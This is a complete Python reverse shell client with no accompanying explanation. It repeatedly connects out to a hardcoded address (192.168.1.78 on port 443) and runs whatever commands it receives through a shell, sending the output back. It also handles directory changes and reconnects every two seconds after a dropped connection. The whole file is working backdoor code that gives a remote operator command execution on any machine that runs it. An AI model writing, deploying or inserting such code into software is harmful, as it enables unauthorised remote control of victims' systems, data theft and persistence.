import socket
from time import sleep
import subprocess
import os

IP = '192.168.1.78'
PORT = 443

def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))

        return c
    except Exception as e:  
        print(f'Connection Error {e}')

def listen(c):
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == '/exit':
                return
            else:
                cmd(c, data) 
    except Exception as e:
        print(f'Listen function error:  {e}')
        
def cmd(c, data):
    try:
        if data.startswith("cd "):
            try:
                os.chdir(data[3:].strip())
                c.send(b"Directory changed successfully\n")
            except:
                c.send(b"Failed to change directory\n")
            return
        
        p = subprocess.Popen(
            data,
            shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )
        
        output = p.stdout.read() + p.stderr.read()
        if not output:
            output = b"Command executed successfully\n"
            print(output)
        c.send(output)
        
    except Exception as e:
        error_msg = f"Command error: {str(e)}\n".encode()
        print(error_msg)

if __name__ == '__main__':
    print(f"Starting client, connecting to {IP}:{PORT}")
    try:
        while True:
            client = connect(IP, PORT)
            if client:
                print("Connected successfully!")
                listen(client)
                client.close()
                print("Connection closed, retrying...")
            sleep(2)
            
    except KeyboardInterrupt:
        print("\nProgram interrupted by user")
    except Exception as e:
        print(f"Main connection error: {e}")